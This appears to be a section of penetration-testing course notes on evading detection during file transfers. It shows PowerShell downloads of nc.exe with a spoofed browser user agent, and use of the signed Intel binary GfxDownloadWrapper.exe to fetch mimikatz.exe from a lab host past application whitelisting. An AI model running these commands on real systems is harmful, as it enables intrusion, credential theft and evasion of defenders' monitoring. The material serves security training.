# 10 — Evading Detection

## Overview

The previous section showed how defenders detect file transfers via User-Agent strings and command-line monitoring. This section covers **how to evade those detections** — spoofing user agents and using obscure LOLBins that bypass application whitelisting.

---

## Changing User Agents in PowerShell

`Invoke-WebRequest` has a `-UserAgent` parameter that lets you **impersonate a legitimate browser**.

### List All Built-in User Agent Options

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

**Available options:**

| Name | User-Agent String |
|------|-------------------|
| **InternetExplorer** | `Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)` |
| **Firefox** | `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0` |
| **Chrome** | `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6` |
| **Opera** | `Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1` |
| **Safari** | `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16` |

### Download with a Spoofed Chrome User Agent

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

**What the server sees now:**

```
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
```

> Instead of `WindowsPowerShell/5.1` — it now looks like Chrome browser traffic. Pick whichever browser the organization actually uses internally to blend in best.

---

## Obscure LOLBins for Whitelisting Bypass

When application whitelisting blocks PowerShell, Netcat, and other common tools, look for **unexpected binaries** that have download capabilities.

### Example: GfxDownloadWrapper.exe

The **Intel Graphics Driver for Windows 10** includes a binary that downloads config files. It can be repurposed:

```powershell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

**Why this works:**
- ✅ It's a signed Intel binary — application whitelisting trusts it
- ✅ It's not on most detection rule lists
- ✅ It performs a legitimate HTTP download under the hood

> Not every system has this binary — the point is to **search LOLBAS/GTFOBins for whatever IS on the target**.

---

## Evasion Decision Tree

```
Can you use PowerShell?
├── YES → Spoof the User-Agent to match internal browser
│         $ua = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
│         Invoke-WebRequest -UserAgent $ua ...
│
└── NO (blocked by whitelisting)
    ├── Check LOLBAS for download-capable binaries on the system
    │   └── GfxDownloadWrapper.exe, certreq.exe, etc.
    │
    └── Check GTFOBins for Linux alternatives
        └── openssl, wget, curl, python, etc.
```

---

## Module Wrap-Up: File Transfer Methods Summary

| Section | Key Takeaway |
|---------|-------------|
| 01 — Introduction | File transfers are core to every phase of a pentest |
| 02 — Windows Downloads | PowerShell, certutil, SMB, BITS |
| 03 — Linux Transfers | wget, curl, SCP, Python HTTP server |
| 04 — Transferring with Code | Python, PHP, Perl, Ruby, JavaScript, VBScript |
| 05 — Miscellaneous Methods | Netcat, Ncat, /dev/tcp, WinRM, RDP |
| 06 — Protected Transfers | AES encryption (PowerShell), OpenSSL encryption (Linux) |
| 07 — Catching Files over HTTP/S | Nginx PUT upload server |
| 08 — Living off the Land | LOLBins — use what's already installed |
| 09 — Detection | User-Agent fingerprints, command-line monitoring |
| 10 — Evading Detection | Spoof user agents, obscure LOLBins bypass whitelisting |

> 💡 **The #1 lesson from this entire module:** Have multiple methods ready. When one gets blocked, switch to another. Practice all of them so you have muscle memory when it counts.
